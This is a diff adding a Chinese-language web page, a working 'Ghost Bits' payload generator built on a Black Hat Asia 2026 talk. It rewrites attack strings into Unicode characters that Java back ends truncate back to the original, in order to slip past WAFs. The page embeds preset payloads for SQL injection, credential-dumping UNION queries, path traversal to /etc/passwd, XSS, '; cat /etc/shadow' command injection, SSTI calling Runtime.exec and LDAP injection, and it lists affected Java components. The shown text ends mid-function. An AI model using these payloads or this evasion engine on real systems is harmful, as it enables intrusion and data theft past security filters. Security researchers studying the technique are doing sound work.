@@ -1,0 +1,1169 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ghost Bits Payload 变形工具</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg-primary: #0a0e17;
+    --bg-secondary: #111827;
+    --bg-card: #1a2332;
+    --bg-input: #0d1520;
+    --border: #1e3a5f;
+    --border-focus: #3b82f6;
+    --text-primary: #e2e8f0;
+    --text-secondary: #94a3b8;
+    --text-muted: #64748b;
+    --accent: #3b82f6;
+    --accent-hover: #2563eb;
+    --success: #10b981;
+    --warning: #f59e0b;
+    --danger: #ef4444;
+    --ghost: #8b5cf6;
+    --ghost-dim: #6d28d9;
+    --radius: 8px;
+    --radius-lg: 12px;
+    --font-mono: 'SF Mono', 'Cascadia Code', 'Fira Code', 'JetBrains Mono', monospace;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: var(--bg-primary);
+    color: var(--text-primary);
+    min-height: 100vh;
+    line-height: 1.6;
+  }
+
+  /* Header */
+  .header {
+    background: linear-gradient(135deg, var(--bg-secondary) 0%, #1a1a2e 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 24px 0;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(circle at 20% 50%, rgba(139,92,246,0.08) 0%, transparent 50%),
+                radial-gradient(circle at 80% 50%, rgba(59,130,246,0.08) 0%, transparent 50%);
+    pointer-events: none;
+  }
+  .header h1 {
+    font-size: 28px;
+    font-weight: 700;
+    background: linear-gradient(135deg, var(--ghost) 0%, var(--accent) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    position: relative;
+  }
+  .header p {
+    color: var(--text-secondary);
+    font-size: 14px;
+    margin-top: 6px;
+    position: relative;
+  }
+
+  /* Badge */
+  .badge {
+    display: inline-block;
+    padding: 2px 10px;
+    border-radius: 999px;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .badge-ghost { background: rgba(139,92,246,0.15); color: var(--ghost); border: 1px solid rgba(139,92,246,0.3); }
+  .badge-warn { background: rgba(245,158,11,0.15); color: var(--warning); border: 1px solid rgba(245,158,11,0.3); }
+
+  /* Container */
+  .container { max-width: 1200px; margin: 0 auto; padding: 24px 20px; }
+
+  /* Warning banner */
+  .warn-banner {
+    background: rgba(245,158,11,0.08);
+    border: 1px solid rgba(245,158,11,0.25);
+    border-radius: var(--radius-lg);
+    padding: 14px 20px;
+    margin-bottom: 24px;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    font-size: 13px;
+    color: var(--warning);
+  }
+  .warn-banner .icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+  .warn-banner strong { color: #fbbf24; }
+
+  /* Card */
+  .card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-lg);
+    padding: 24px;
+    margin-bottom: 20px;
+  }
+  .card-title {
+    font-size: 16px;
+    font-weight: 600;
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .card-title .dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--accent);
+    display: inline-block;
+  }
+
+  /* Layout */
+  .input-output-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+  }
+  @media (max-width: 860px) {
+    .input-output-grid { grid-template-columns: 1fr; }
+  }
+
+  /* Textarea */
+  textarea, .output-box {
+    width: 100%;
+    min-height: 180px;
+    background: var(--bg-input);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--text-primary);
+    font-family: var(--font-mono);
+    font-size: 13px;
+    padding: 14px;
+    resize: vertical;
+    outline: none;
+    transition: border-color 0.2s;
+    line-height: 1.5;
+    word-break: break-all;
+  }
+  textarea:focus { border-color: var(--border-focus); }
+  textarea::placeholder { color: var(--text-muted); }
+  .output-box {
+    overflow: auto;
+    white-space: pre-wrap;
+    cursor: text;
+    user-select: all;
+  }
+
+  /* Options row */
+  .options-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+    align-items: flex-end;
+    margin-bottom: 20px;
+  }
+  .option-group { display: flex; flex-direction: column; gap: 6px; }
+  .option-group label {
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text-secondary);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  select, input[type="text"] {
+    background: var(--bg-input);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--text-primary);
+    font-size: 13px;
+    padding: 8px 12px;
+    outline: none;
+    font-family: inherit;
+    transition: border-color 0.2s;
+  }
+  select:focus, input[type="text"]:focus { border-color: var(--border-focus); }
+  select { cursor: pointer; }
+
+  /* Checkbox group */
+  .checkbox-group {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+  }
+  .checkbox-item {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 13px;
+    color: var(--text-secondary);
+    cursor: pointer;
+  }
+  .checkbox-item input[type="checkbox"] {
+    accent-color: var(--accent);
+    cursor: pointer;
+  }
+
+  /* Buttons */
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 10px 20px;
+    border: none;
+    border-radius: var(--radius);
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: inherit;
+  }
+  .btn-primary {
+    background: linear-gradient(135deg, var(--ghost) 0%, var(--accent) 100%);
+    color: white;
+    box-shadow: 0 2px 12px rgba(59,130,246,0.25);
+  }
+  .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 4px 20px rgba(59,130,246,0.35); }
+  .btn-secondary {
+    background: var(--bg-secondary);
+    color: var(--text-secondary);
+    border: 1px solid var(--border);
+  }
+  .btn-secondary:hover { border-color: var(--text-muted); color: var(--text-primary); }
+  .btn-sm { padding: 6px 12px; font-size: 12px; }
+  .btn-icon {
+    width: 34px; height: 34px;
+    padding: 0;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: var(--radius);
+    border: 1px solid var(--border);
+    background: var(--bg-secondary);
+    color: var(--text-secondary);
+    cursor: pointer;
+    transition: all 0.2s;
+    font-size: 14px;
+  }
+  .btn-icon:hover { border-color: var(--accent); color: var(--accent); }
+
+  /* Action bar */
+  .action-bar {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin: 20px 0;
+  }
+
+  /* Output format tabs */
+  .format-tabs {
+    display: flex;
+    gap: 2px;
+    background: var(--bg-input);
+    border-radius: var(--radius);
+    padding: 3px;
+    margin-bottom: 12px;
+  }
+  .format-tab {
+    flex: 1;
+    padding: 7px 14px;
+    border: none;
+    background: transparent;
+    color: var(--text-muted);
+    font-size: 12px;
+    font-weight: 600;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: inherit;
+  }
+  .format-tab.active {
+    background: var(--bg-secondary);
+    color: var(--text-primary);
+    box-shadow: 0 1px 4px rgba(0,0,0,0.3);
+  }
+  .format-tab:hover:not(.active) { color: var(--text-secondary); }
+
+  /* Mapping table */
+  .mapping-section { margin-top: 24px; }
+  .mapping-search {
+    width: 100%;
+    max-width: 320px;
+    margin-bottom: 12px;
+  }
+  .mapping-table-wrap {
+    max-height: 420px;
+    overflow: auto;
+    border-radius: var(--radius);
+    border: 1px solid var(--border);
+  }
+  .mapping-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13px;
+    font-family: var(--font-mono);
+  }
+  .mapping-table thead { position: sticky; top: 0; z-index: 1; }
+  .mapping-table th {
+    background: var(--bg-secondary);
+    color: var(--text-secondary);
+    text-align: left;
+    padding: 10px 14px;
+    font-weight: 600;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    border-bottom: 1px solid var(--border);
+  }
+  .mapping-table td {
+    padding: 8px 14px;
+    border-bottom: 1px solid rgba(30,58,95,0.4);
+    vertical-align: middle;
+  }
+  .mapping-table tr:hover td { background: rgba(59,130,246,0.04); }
+  .mapping-table .char-cell {
+    font-size: 18px;
+    text-align: center;
+    min-width: 40px;
+  }
+  .mapping-table .ghost-char { color: var(--ghost); }
+  .mapping-table .orig-char { color: var(--success); }
+  .mapping-table .hex-cell { color: var(--text-muted); font-size: 12px; }
+  .mapping-table .arrow { color: var(--text-muted); text-align: center; }
+
+  .changed-row td { background: rgba(139,92,246,0.06); }
+  .unchanged-row td { opacity: 0.45; }
+
+  /* Stats bar */
+  .stats-bar {
+    display: flex;
+    gap: 20px;
+    flex-wrap: wrap;
+    padding: 12px 0;
+    margin-bottom: 8px;
+  }
+  .stat-item {
+    font-size: 13px;
+    color: var(--text-secondary);
+  }
+  .stat-value { font-weight: 700; color: var(--text-primary); font-family: var(--font-mono); }
+  .stat-value.ghost-color { color: var(--ghost); }
+
+  /* Presets */
+  .presets-section { margin-top: 24px; }
+  .preset-chips {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+  .preset-chip {
+    padding: 6px 14px;
+    border-radius: 999px;
+    font-size: 12px;
+    font-family: var(--font-mono);
+    background: var(--bg-input);
+    border: 1px solid var(--border);
+    color: var(--text-secondary);
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .preset-chip:hover {
+    border-color: var(--ghost);
+    color: var(--ghost);
+    background: rgba(139,92,246,0.08);
+  }
+
+  /* Theory section */
+  .theory-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 16px;
+    margin-top: 16px;
+  }
+  .theory-card {
+    background: var(--bg-input);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 18px;
+  }
+  .theory-card h4 {
+    font-size: 14px;
+    margin-bottom: 10px;
+    color: var(--text-primary);
+  }
+  .theory-card pre {
+    background: var(--bg-primary);
+    border-radius: 6px;
+    padding: 12px;
+    font-size: 12px;
+    font-family: var(--font-mono);
+    overflow-x: auto;
+    color: var(--text-secondary);
+    line-height: 1.6;
+  }
+  .theory-card p {
+    font-size: 13px;
+    color: var(--text-secondary);
+    line-height: 1.7;
+  }
+  .hl-purple { color: var(--ghost); }
+  .hl-blue { color: var(--accent); }
+  .hl-green { color: var(--success); }
+  .hl-red { color: var(--danger); }
+  .hl-yellow { color: var(--warning); }
+
+  /* Toast */
+  .toast {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 12px 20px;
+    font-size: 13px;
+    color: var(--text-primary);
+    box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+    transform: translateY(100px);
+    opacity: 0;
+    transition: all 0.3s;
+    z-index: 999;
+  }
+  .toast.show { transform: translateY(0); opacity: 1; }
+
+  /* Footer */
+  .footer {
+    text-align: center;
+    padding: 32px 20px;
+    color: var(--text-muted);
+    font-size: 12px;
+    border-top: 1px solid var(--border);
+    margin-top: 32px;
+  }
+  .footer a { color: var(--text-secondary); text-decoration: none; }
+  .footer a:hover { color: var(--accent); }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
+
+  /* Labels */
+  .label-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 8px;
+  }
+  .label-text {
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text-secondary);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .copy-btn {
+    font-size: 12px;
+    color: var(--text-muted);
+    background: none;
+    border: none;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    font-family: inherit;
+    transition: color 0.2s;
+  }
+  .copy-btn:hover { color: var(--accent); }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>Ghost Bits Payload Generator</h1>
+  <p>Java 幽灵比特位 WAF 绕过 Payload 变形工具 &nbsp;<span class="badge badge-ghost">Black Hat Asia 2026</span></p>
+</div>
+
+<div class="container">
+
+  <!-- Warning -->
+  <div class="warn-banner">
+    <span class="icon">⚠️</span>
+    <div>
+      <strong>仅供安全研究与授权测试使用。</strong>利用 Ghost Bits 变形可绕过 WAF 检测触发 SQL 注入、RCE 等高危攻击。未经授权使用本工具对目标系统进行测试属于违法行为。使用本工具即表示您同意仅在合法授权范围内使用。
+    </div>
+  </div>
+
+  <!-- Principle -->
+  <div class="card">
+    <div class="card-title"><span class="dot"></span>原理说明</div>
+    <div class="theory-grid">
+      <div class="theory-card">
+        <h4>Ghost Bits 核心原理</h4>
+        <p>Java 的 <code>char</code> 为 16 位，<code>byte</code> 为 8 位。当通过 <code>(byte)ch</code>、<code>ch &amp; 0xFF</code>、<code>baos.write(ch)</code> 等方式将 char 转为 byte 时，<span class="hl-red">高 8 位被静默丢弃</span>，仅保留低 8 位。</p>
+      </div>
+      <div class="theory-card">
+        <h4>攻击示例</h4>
+        <pre>原始字符: <span class="hl-green">':'</span>  (U+003A)
+替换字符: <span class="hl-purple">'爻'</span> (U+2F58)
+
+爻 → 0x2F58 → 二进制:
+  <span class="hl-red">0x2F</span>(高8位) | <span class="hl-green">0x3A</span>(低8位)
+
+(byte)'爻' → 丢弃高8位 → <span class="hl-green">0x3A</span> → <span class="hl-green">':'</span></pre>
+      </div>
+      <div class="theory-card">
+        <h4>WAF 绕过流程</h4>
+        <pre>攻击者 → [Unicode Payload] → WAF
+                              ↓
+                        看到一堆汉字/符号
+                        无字符串特征匹配
+                              ↓
+                        <span class="hl-yellow">放行</span> ✗
+
+攻击者 → [Unicode Payload] → Java 后端
+                              ↓
+                     (byte)ch 截断高位
+                              ↓
+                     <span class="hl-red">还原原始攻击载荷</span> ✓</pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- Input -->
+  <div class="card">
+    <div class="card-title"><span class="dot"></span>Payload 输入</div>
+
+    <!-- Presets -->
+    <div style="margin-bottom: 16px;">
+      <div class="label-text" style="margin-bottom: 8px;">预设 Payload 示例</div>
+      <div class="preset-chips">
+        <span class="preset-chip" onclick="setPreset('sql')">SQL 注入</span>
+        <span class="preset-chip" onclick="setPreset('union')">UNION 注入</span>
+        <span class="preset-chip" onclick="setPreset('path')">路径穿越</span>
+        <span class="preset-chip" onclick="setPreset('pathArticle')">路径穿越（文章复现风格）</span>
+        <span class="preset-chip" onclick="setPreset('upload')">文件上传</span>
+        <span class="preset-chip" onclick="setPreset('xss')">XSS</span>
+        <span class="preset-chip" onclick="setPreset('cmd')">命令注入</span>
+        <span class="preset-chip" onclick="setPreset('ssti')">SSTI</span>
+        <span class="preset-chip" onclick="setPreset('ldap')">LDAP 注入</span>
+      </div>
+    </div>
+
+    <div class="label-row">
+      <span class="label-text">原始攻击 Payload</span>
+    </div>
+    <textarea id="inputPayload" placeholder="在此输入原始攻击 Payload，例如: 1' OR '1'='1' -- &#10;&#10;或点击上方预设示例快速填入..."></textarea>
+  </div>
+
+  <!-- Options -->
+  <div class="card">
+    <div class="card-title"><span class="dot"></span>变形配置</div>
+    <div class="options-row">
+      <div class="option-group">
+        <label>变形模式</label>
+        <select id="mode" onchange="onModeChange()">
+          <option value="smart">智能变形（仅替换敏感字符）</option>
+          <option value="full">全量变形（替换所有字符）</option>
+          <option value="keyword">关键字变形（仅替换关键词）</option>
+          <option value="custom">自定义字符集</option>
+        </select>
+      </div>
+      <div class="option-group">
+        <label>Unicode 范围（高位字节）</label>
+        <select id="highByte">
+          <option value="0x01">0x01xx — 拉丁扩展 (Latin Extended-A)</option>
+          <option value="0x02">0x02xx — 拉丁扩展 (Latin Extended-B)</option>
+          <option value="0x03">0x03xx — 组合变音符号</option>
+          <option value="0x04">0x04xx — 西里尔字母</option>
+          <option value="0x10">0x10xx — 格鲁吉亚字母</option>
+          <option value="0x2F">0x2Fxx — CJK 部首/汉字 (类似爻)</option>
+          <option value="0x4E">0x4Exx — CJK 统一汉字 (一区)</option>
+          <option value="0x67">0x67xx — CJK 统一汉字 (木/氵部)</option>
+          <option value="0x70">0x70xx — CJK 统一汉字 (月/火部)</option>
+          <option value="0x75">0x75xx — CJK 统一汉字 (牛/田部)</option>
+          <option value="0x96">0x96xx — CJK 统一汉字 (阮/陈部)</option>
+          <option value="0x80">0x80xx — CJK 统一汉字辅区</option>
+          <option value="random">随机高位（多区块混合）</option>
+          <option value="cjk" selected>推荐: CJK 混淆（自然中文路径风格）</option>
+        </select>
+      </div>
+      <div class="option-group" id="customCharGroup" style="display:none;">
+        <label>自定义替换字符</label>
+        <input type="text" id="customChars" placeholder="如: ';&lt;&gt;=--" style="width:200px;">
+      </div>
+    </div>
+    <div class="checkbox-group" style="margin-top: 8px;">
+      <label class="checkbox-item"><input type="checkbox" id="preserveSpace" checked> 保留空格不变</label>
+      <label class="checkbox-item"><input type="checkbox" id="preserveNewline" checked> 保留换行符不变</label>
+    </div>
+  </div>
+
+  <!-- Action -->
+  <div class="action-bar">
+    <button class="btn btn-primary" onclick="transform()">⚡ 生成 Ghost Bits Payload</button>
+    <button class="btn btn-secondary" onclick="decode()">🔓 解码还原</button>
+    <button class="btn btn-secondary" onclick="clearAll()">清空</button>
+  </div>
+
+  <!-- Output -->
+  <div id="outputSection" style="display:none;">
+    <!-- Stats -->
+    <div class="card">
+      <div class="card-title"><span class="dot"></span>转换统计</div>
+      <div class="stats-bar" id="statsBar"></div>
+    </div>
+
+    <div class="input-output-grid">
+      <!-- Transformed output -->
+      <div class="card">
+        <div class="card-title"><span class="dot" style="background:var(--ghost);"></span>变形 Payload</div>
+        <div class="format-tabs" id="outputTabs">
+          <button class="format-tab active" onclick="switchOutputFormat('raw', this)">UTF-8 文本</button>
+          <button class="format-tab" onclick="switchOutputFormat('url', this)">URL 编码</button>
+          <button class="format-tab" onclick="switchOutputFormat('unicode', this)">\\uXXXX 转义</button>
+          <button class="format-tab" onclick="switchOutputFormat('java', this)">Java 字符串</button>
+          <button class="format-tab" onclick="switchOutputFormat('bytes', this)">UTF-8 字节</button>
+        </div>
+        <div class="label-row">
+          <span class="label-text">输出</span>
+          <button class="copy-btn" onclick="copyOutput()">📋 复制</button>
+        </div>
+        <div class="output-box" id="outputBox"></div>
+      </div>
+
+      <!-- Side by side -->
+      <div class="card">
+        <div class="card-title"><span class="dot" style="background:var(--success);"></span>对比视图</div>
+        <div class="label-row">
+          <span class="label-text">原始 ↔ 变形（逐字符对比）</span>
+        </div>
+        <div class="output-box" id="compareBox" style="font-size: 14px;"></div>
+      </div>
+    </div>
+
+    <!-- Decode result -->
+    <div id="decodeResultSection" class="card" style="display:none;">
+      <div class="card-title"><span class="dot" style="background:var(--warning);"></span>解码还原结果</div>
+      <div class="label-row">
+        <span class="label-text">Ghost Bits 截断高 8 位后的原始 Payload</span>
+        <button class="copy-btn" onclick="copyDecodeResult()">📋 复制</button>
+      </div>
+      <div class="output-box" id="decodeResultBox" style="color:var(--warning);"></div>
+    </div>
+    </div>
+
+    <!-- Mapping table -->
+    <div class="card mapping-section">
+      <div class="card-title"><span class="dot" style="background:var(--warning);"></span>字符映射表</div>
+      <div class="label-row">
+        <input type="text" class="mapping-search" id="mappingSearch" placeholder="搜索字符..." oninput="filterMapping()">
+      </div>
+      <div class="mapping-table-wrap">
+        <table class="mapping-table" id="mappingTable">
+          <thead>
+            <tr>
+              <th>原始字符</th>
+              <th>ASCII / Hex</th>
+              <th></th>
+              <th>变形字符</th>
+              <th>Unicode Code Point</th>
+              <th>状态</th>
+            </tr>
+          </thead>
+          <tbody id="mappingBody"></tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- References -->
+  <div class="card">
+    <div class="card-title"><span class="dot" style="background:var(--danger);"></span>受影响组件速查</div>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(220px,1fr)); gap: 12px; font-size: 13px; color: var(--text-secondary);">
+      <div><strong style="color:var(--text-primary)">Apache Commons BCEL</strong><br>WAF 绕过 / 反序列化 RCE</div>
+      <div><strong style="color:var(--text-primary)">Jackson Databind</strong><br>WAF 绕过 / SQL 注入</div>
+      <div><strong style="color:var(--text-primary)">Fastjson</strong><br>WAF 绕过 / 反序列化 RCE</div>
+      <div><strong style="color:var(--text-primary)">Apache Tomcat</strong><br>文件上传绕过 (Webshell)</div>
+      <div><strong style="color:var(--text-primary)">Spring Framework</strong><br>URL 解码绕过 / 路径穿越</div>
+      <div><strong style="color:var(--text-primary)">Jetty</strong><br>URL 解码绕过 / CRLF 注入</div>
+      <div><strong style="color:var(--text-primary)">Angus Mail</strong><br>SMTP 注入</div>
+      <div><strong style="color:var(--text-primary)">Apache HttpClient ≤ 4.5.9</strong><br>HTTP 请求走私</div>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  基于 Black Hat Asia 2026 议题《Cast Attack: A New Threat Posed by Ghost Bits in Java》 — 仅供安全研究与授权测试
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ========== Presets ==========
+const PRESETS = {
+  sql: `1' OR '1'='1' --`,
+  union: `1' UNION SELECT username,password FROM users--`,
+  path: `../../../../etc/passwd`,
+  pathArticle: `../../../../../../../etc/passw%64`,
+  upload: `shell.jsp`,
+  xss: '<scr' + 'ipt>alert(\'XSS\')</scr' + 'ipt>',
+  cmd: `; cat /etc/shadow`,
+  ssti: `\${T(java.lang.Runtime).getRuntime().exec('id')}`,
+  ldap: `*)(uid=*))(|(uid=*`
+};
+
+// Characters to transform in smart mode
+const SENSITIVE_CHARS = new Set([
+  "'", '"', ';', '-', '<', '>', '=', '(', ')', '{', '}', '[', ']', '|', '&',
+  '`', '$', '\\', '/', '.', '*', '%', '+', '!', '@', '#', '~', '?', ':',
+  ',', '\t'
+]);
+
+// SQL / common attack keywords
+const KEYWORDS = [
+  'SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'UNION', 'WHERE', 'FROM',
+  'OR', 'AND', 'NOT', 'LIKE', 'IN', 'BETWEEN', 'EXISTS', 'HAVING', 'GROUP BY',
+  'ORDER BY', 'JOIN', 'INNER', 'OUTER', 'LEFT', 'RIGHT', 'FULL', 'CROSS',
+  'ON', 'AS', 'SET', 'INTO', 'VALUES', 'CREATE', 'ALTER', 'TRUNCATE', 'EXEC',
+  'EXECUTE', 'EXECUTEMASTER', 'xp_', 'sp_', 'CONCAT', 'CHAR', 'CAST',
+  'CONVERT', 'LOAD_FILE', 'OUTFILE', 'DUMPFILE', 'BENCHMARK', 'SLEEP',
+  'WAITFOR', 'DELAY', 'PG_SLEEP', 'IFNULL', 'NULL', 'TRUE', 'FALSE',
+  'SCRIPT', 'ALERT', 'PROMPT', 'CONFIRM', 'DOCUMENT', 'WINDOW', 'LOCATION',
+  'COOKIE', 'FETCH', 'IMPORT', 'EXPORT', 'RUNTIME', 'PROCESSBUILDER',
+  'GETCLASS', 'FORNAME', 'GETRUNTIME', 'EXEC', 'PASSWD', 'SHADOW',
+  'ETC', 'TMP', 'VAR', 'USR', 'HOME', 'ROOT', 'ADMIN',
+  'USERNAME', 'PASSWORD', 'TOKEN', 'SESSION', 'AUTH',
+  'JAVA', 'LANG', 'TYPE', 'CLASS', 'STRING', 'OBJECT',
+  'EVIL', 'SHELL', 'BACKDOOR', 'WEBSHELL', 'PAYLOAD', 'EXPLOIT',
+  'HTTP', 'HTTPS', 'FTP', 'LDAP', 'SMTP', 'DNS',
+  'CMD', 'BAT', 'SH', 'BASH', 'POWERSHELL', 'RCE',
+  'JSP', 'PHP', 'ASP', 'ASPX', 'CGI', 'PL',
+  'TOMCAT', 'SPRING', 'JETTY', 'JBOSS', 'WEBLOGIC', 'WEBSPHERE',
+  'JNDI', 'RMI', 'CORBA', 'LDAP',
+  'X-FORWARDED-FOR', 'CONTENT-TYPE', 'USER-AGENT', 'REFERER',
+  'UID', 'CN', 'DN', 'DC', 'OU', 'FILTER', 'SEARCH'
+];
+
+// ========== State ==========
+let currentTransformResult = null;
+let currentOutputFormat = 'raw';
+
+// ========== Transform Engine ==========
+
+function getHighByte() {
+  const sel = document.getElementById('highByte').value;
+  if (sel === 'random' || sel === 'cjk') {
+    return sel;
+  }
+  return parseInt(sel, 16);
+}
+
+const CJK_HIGH_BYTES = [0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98];
+
+const MIXED_HIGH_BYTES = [0x01, 0x02, 0x04, 0x10, 0x1A, 0x20, 0x21, 0x22, 0x2F, 0x30, 0x31, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x67, 0x70, 0x75, 0x80, 0x96];
+
+function pickHighByte(baseHighByte) {
+  if (baseHighByte === 'cjk') {
+    return CJK_HIGH_BYTES[Math.floor(Math.random() * CJK_HIGH_BYTES.length)];
+  }
+  if (baseHighByte === 'random') {
+    return MIXED_HIGH_BYTES[Math.floor(Math.random() * MIXED_HIGH_BYTES.length)];
+  }
+  return baseHighByte;
+}
+
+function toGhostChar(byteValue, highByteBase) {
+  const highByte = pickHighByte(highByteBase);
+  const codePoint = (highByte << 8) | byteValue;
+  return { codePoint, char: String.fromCodePoint(codePoint) };
+}
+
+function shouldTransform(charCode, mode, payload, index) {
+  const ch = String.fromCharCode(charCode);
+
+  if (ch === ' ' && document.getElementById('preserveSpace').checked) return false;
+  if (ch === '\n' && document.getElementById('preserveNewline').checked) return false;
+  if (ch === '\r' && document.getElementById('preserveNewline').checked) return false;
+
+  switch (mode) {
+    case 'full':
+      return true;
+    case 'smart':
+      return SENSITIVE_CHARS.has(ch) || /[\x00-\x08\x0B\x0C\x0E-\x1F]/.test(ch);
+    case 'keyword': {
+      const upper = payload.toUpperCase();
+      for (const kw of KEYWORDS) {
+        const kwLower = kw.toLowerCase();
+        const kwIdx = upper.indexOf(kw.toUpperCase());
+        if (kwIdx !== -1) {
+          for (let i = kwIdx; i < kwIdx + kw.length; i++) {
+            if (i === index) return true;
+          }
+        }
+      }
+      return false;
+    }
+    case 'custom': {
+      const customChars = document.getElementById('customChars').value;
+      return customChars.includes(ch);
+    }
+    default:
+      return false;
+  }
+}
+
+function transform() {
+  const input = document.getElementById('inputPayload').value;
+  if (!input.trim()) {
+    showToast('请先输入 Payload');
+    return;
+  }
+
+  const mode = document.getElementById('mode').value;
+  const highByteBase = getHighByte();
+
+  const mappings = [];
+  let transformed = '';
+  let changedCount = 0;
+  let totalChars = 0;
+
+  for (let i = 0; i < input.length; i++) {
+    const charCode = input.charCodeAt(i);
+    totalChars++;
+
+    if (shouldTransform(charCode, mode, input, i)) {
+      const ghost = toGhostChar(charCode & 0xFF, highByteBase);
+      transformed += ghost.char;
+      mappings.push({
+        original: input[i],
+        originalCode: charCode,
+        originalHex: '0x' + charCode.toString(16).toUpperCase().padStart(2, '0'),
+        ghostChar: ghost.char,
+        ghostCodePoint: ghost.codePoint,
+        ghostHex: 'U+' + ghost.codePoint.toString(16).toUpperCase().padStart(4, '0'),
+        ghostBinary: ghost.codePoint.toString(2).padStart(16, '0'),
+        changed: true
+      });
+      changedCount++;
+    } else {
+      transformed += input[i];
+      mappings.push({
+        original: input[i],
+        originalCode: charCode,
+        originalHex: '0x' + charCode.toString(16).toUpperCase().padStart(2, '0'),
+        ghostChar: input[i],
+        ghostCodePoint: charCode,
+        ghostHex: 'U+' + charCode.toString(16).toUpperCase().padStart(4, '0'),
+        ghostBinary: charCode.toString(2).padStart(16, '0'),
+        changed: false
+      });
+    }
+  }
+
+  currentTransformResult = {
+    original: input,
+    transformed,
+    mappings,
+    changedCount,
+    totalChars,
+    mode,
+    highByteBase
+  };
+
+  renderOutput();
+}
+
+// ========== Rendering ==========
+
+function renderOutput() {
+  const r = currentTransformResult;
+  document.getElementById('outputSection').style.display = 'block';
+
+  // Stats
+  const pct = r.totalChars > 0 ? ((r.changedCount / r.totalChars) * 100).toFixed(1) : 0;
+  document.getElementById('statsBar').innerHTML = `
+    <div class="stat-item">总字符数: <span class="stat-value">${r.totalChars}</span></div>
+    <div class="stat-item">已变形: <span class="stat-value ghost-color">${r.changedCount}</span></div>
+    <div class="stat-item">未变形: <span class="stat-value">${r.totalChars - r.changedCount}</span></div>
+    <div class="stat-item">变形率: <span class="stat-value ghost-color">${pct}%</span></div>
+    <div class="stat-item">输出长度: <span class="stat-value">${r.transformed.length} chars</span></div>
+  `;
+
+  // Output box
+  renderOutputBox(currentOutputFormat);
+
+  // Compare box
+  renderCompareBox();
+
+  // Mapping table
+  renderMappingTable();
+}
+
+function formatOutput(format) {
+  const r = currentTransformResult;
+  switch (format) {
+    case 'raw':
+      return r.transformed;
+    case 'url':
+      return encodeURIComponent(r.transformed);
+    case 'unicode': {
+      let result = '';
+      for (let i = 0; i < r.transformed.length; i++) {
